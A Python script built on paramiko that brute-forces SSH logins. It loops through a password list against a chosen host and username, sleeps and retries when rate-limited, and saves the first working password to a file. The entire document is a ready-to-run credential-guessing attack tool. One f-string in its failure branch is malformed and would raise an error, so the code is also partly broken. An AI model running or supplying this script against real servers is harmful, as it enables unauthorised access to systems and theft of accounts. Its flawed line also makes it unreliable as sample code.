import paramiko
import socket
import time

def is_ssh_open(hostname, username, password):
    # Initialise SSH Client
    client = paramiko.SSHClient()
    # add to known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # if host is unreachable
        print("Host is unreachable")
        return False
    except paramiko.AuthenticationException:
        print(f"Invalid Credentials for {username:password}")
        return False
    except paramiko.SSHException:
        print("Quota exceded, going to sleep")
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # Connection was successfully established
        print(f"Found successful combination: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}") 
        return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Script")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce")
    parser.add_argument("-P", "--passlist", help="Password list")
    parser.add_argument("-u", "--user", help="Host username")

    # Parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    # Read password list file
    passlist = open(passlist).read().splitlines()
    # Attack
    for password in passlist:
        if is_ssh_open(host, user, password):
            # If combo is valid, save it to a file
            open("cred.txt", "w").write(f"{user}@{host}:{password}")
            break